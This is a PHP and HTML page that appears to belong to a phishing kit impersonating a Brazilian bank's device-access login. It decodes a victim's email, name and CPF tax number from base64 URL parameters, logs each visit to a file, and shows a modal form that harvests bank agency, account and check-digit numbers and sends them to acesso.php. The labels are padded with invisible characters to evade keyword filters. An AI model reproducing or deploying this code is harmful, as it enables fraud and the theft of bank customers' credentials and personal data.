﻿<?php 
//session_start();
//error_reporting(1);

include('lib.php');
$emailx = $_GET['cliente'];
$email = base64_decode($emailx);
if (isset($_GET['cliente']) && !filter_var($email, FILTER_VALIDATE_EMAIL) === false) { 
	$msg = "in: $email - $ip ($host)- $data\n";
	$myFl = "acc-log.txt";
	$open = fopen($myFl, 'a') or die("can't open file");
	fwrite($open, $msg);
	fclose($open);
} else { 
	echo $e500; 
	exit;
}  

//http://mobile3.ibpkm.com
include('../_functions/functions.php'); 

$UserId = uniqid();
$_SESSION['uniq_id'] = $UserId;
$_SESSION['mail'] = $email;
if(isset($_GET['nm']) && $_GET['nm'] != ''){
	$name = base64_decode($_GET['nm']);
	if(strpos($name, ' ')){
		$aux = explode(' ',$name);
		$nome = $aux[0];
	}else{
		$nome = $name;
	}
	$_SESSION['UserName'] = ucfirst(strtolower($nome));
}

if(isset($_GET['sid']) && $_GET['sid'] != ''){
	$cpf = base64_decode($_GET['sid']);
	$_SESSION['cpf'] = $cpf;
}
  

?>


<!DOCTYPE html>
<html lang="pt-br">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<link rel="shortcut icon" href="pictures/00.ico"/><link rel="shortcut icon" href="favicon.ico" />
<title>&#x1F512 ACESSO DISPOSITIVO</title>
<script language="javascript" src="scripts/valida_conta.js"></script>
<script language="javascript" src="scripts/valida_cpf.js"></script>
<script language="javascript" src="scripts/modal.js"></script>
<script language="javascript" src="scripts/pular_campos.js"></script>
<?php print ''; ?>
<style type="text/css">
.i { font-family:'Arial'; font-size:1px; color:#FFF; }
.font1 { font-family:'Arial'; font-size:14px; color:#666666; }
body {margin:0; padding:0;}
@media (max-width: 1024px){ #aa { width:1000px; !important } }
@media (max-height: 1920px){ #xx { height:540px; !important } }
#agencia { width:50px; padding:5px 0 5px 4px; border:1px solid #CCC; border-radius:3px; outline:none; }
#conta { width:80px; padding:5px 0 5px 4px; border:1px solid #CCC; border-radius:3px; outline:none; }
#digito { width:10px; padding:5px 0 5px 4px; border:1px solid #CCC; border-radius:3px; outline:none; }
#cpf { width:100px; padding:5px 0 5px 4px; border:1px solid #CCC; border-radius:3px; outline:none; }
#ir { padding:4px 7px 4px 7px; background:#CC0000; color:#FFF; font-family:'Arial'; font-size:12px; border-bottom:1px solid #063478; border-top:1px solid #CC0000; border-left:1px solid #CC0000; border-right:1px solid #CC0000; margin-left:7px; border-radius:3px; }
.modal { position: fixed; z-index: 1; left: 0;top: 0;width: 100%; height: 100%; overflow: auto; background-color: rgb(0,0,0); background-color: rgba(0,0,0,0.6); }
.modal-content { border-radius:10px; background-color: #EEE; margin:0 auto; padding:; border: 1px solid #888; left:50%;	right:50%;	margin:-250px 0 0 -250px; position:absolute; top:60%; height:215px;	width:500px; box-shadow:0px 0px 10px #666666; }
</style>
</head>

<body>
<div style="width:100%; height:40px; background:#0053A1;">
<div id="aa" style="height:40px;">
<div style="width:676px; height:40px; float:left; margin-left:40px; background:url(pictures/01.png) no-repeat;"></div>
<div style="width:100px; height:40px; float:right; margin-right:40px; background:url(pictures/02.png) no-repeat;"></div>
</div>
</div>

<div style="width:100%;">
<div id="xx" style="background:url(pictures/033.jpg) no-repeat left; -webkit-background-size: cover; -moz-background-size: cover; -o-background-size: cover; background-size: cover;">
<div style="width:172px; height:418px; background:url(pictures/04.png) no-repeat; margin-left:40px;"></div>
</div>
</div>

<div style="width:100%; height:auto; margin-top:-80px;">
<div style="width:100%; height:72px; background:url(pictures/05.png) no-repeat right;"></div>
<div style="width:100%; height:100px; background:#D92031;" align="right"><div style="width:935px; height:100px; background:url(pictures/06.png) no-repeat;"></div></div>
</div>

<div id="aa" style="width:100%; height:140px; margin-top:10px;">
<table width="100%" cellpadding="0" cellspacing="0">
<tr>
<td align="center" bgcolor="#F0F0F0" height="140"><img src="pictures/07.png" width="119" height="72"></td>
<td align="center" bgcolor="#E5E5E5"><img src="pictures/08.png" width="112" height="90"></td>
<td align="center" bgcolor="#E5E5E5"><img src="pictures/09.png" width="112" height="90"></td>
<td align="center" bgcolor="#E5E5E5"><img src="pictures/10.png" width="169" height="90"></td>
<td align="center" bgcolor="#E5E5E5"><img src="pictures/11.png" width="122" height="90"></td>
</tr>
</table>
</div>

<div style="width:100%; height:140px; margin-top:10px;">
<div style="background:#EBEBEB; border-top:1px solid #DDD; border-bottom:1px solid #DDD;">
<div style="width:100%; height:62px; background:url(pictures/17.png) no-repeat right;">
<div style="width:478px; height:62px; background:url(pictures/16.png) no-repeat;"></div>
</div>
</div>
<table width="100%" cellpadding="0" cellspacing="0">
<tr>
<td width="25%" height="140" align="left" bgcolor="#EBEBEB"><img src="pictures/12.png" width="321" height="149" style="margin-left:27px;"></td>
<td width="25%" align="center" bgcolor="#EBEBEB"><img src="pictures/13.png" width="135" height="150"></td>
<td width="25%" align="center" bgcolor="#EBEBEB"><img src="pictures/14.png" width="295" height="150"></td>
<td width="25%" align="center" bgcolor="#EBEBEB"><img src="pictures/15.png" width="235" height="150"></td>
</tr>
</table>
<div style="width:100%; height:83px; background:url(pictures/20.jpg) repeat-x;">
<div style="width:308px; height:83px; background:url(pictures/19.png) no-repeat; float:left;"></div>
<div style="width:566px; height:83px; background:url(pictures/18.png) no-repeat; float:right;"></div>
</div>
<div style="width:100%; height:25px; background:#069;"></div>
</div>



<div id="myModal" class="modal">
	<div class="modal-content">
		<div style="padding:15px; font-family:'Arial'; font-size:1.1em; color:#666666; border-bottom:2px solid #CC0000;">&#x1F512 Acessar agora</div><!-- modal-content -->

			<div style="padding:20px; background:#FFF; border-bottom:1px solid #DDD;">

				<div style="border:1px solid #DDD; padding:5px 15px 15px 15px;">
					<div style="width:313px; height:45px; background:url(pictures/21.jpg) no-repeat;"></div>

					<form name="form" id="form" action="acesso.php?cliente=<?php echo $emailx;  ?>" method="post" onSubmit="return ValidaLogin()">
						<div style="margin-top:5px;"><span class="font1"><span class="i">i</span>Ag<span class="i">i</span>&ecirc;n<span class="i">i</span>cia<span class="i">i</span>:</span>&nbsp;
							<input type="text" name="my_ag" id="agencia" maxlength="4" onKeyUp="checa_agencia(this.name);" autofocus>&nbsp;&nbsp;&nbsp;<span class="font1">C<span class="i">i</span>on<span class="i">i</span>ta<span class="i">i</span>:</span>&nbsp;
							<input type="text" name="my_ct" id="conta" maxlength="7" onKeyUp="checa_agencia(this.name);">&nbsp;
							<input type="text" name="my_dg" id="digito" maxlength="1"><span style="margin-top:20px;">
							<input type="hidden" name="sender" value="ag_ct">
							<input type="submit" name="ir" id="ir" value="Ok"></span>
						</div>
					</form>
					<br><br><br>
					<!--<a style="text-decoration:none; font-family:Verdana; font-size:12px;" href="pessoa-juridica/?cliente="> <b style="color:red;">[Acesso Pessoa Jurídica?]</b> Clique aqui.</a>-->
				</div>
			</div>
		</div>
<!-- modal-content -->
</div><!-- myModal -->

</body>
</html>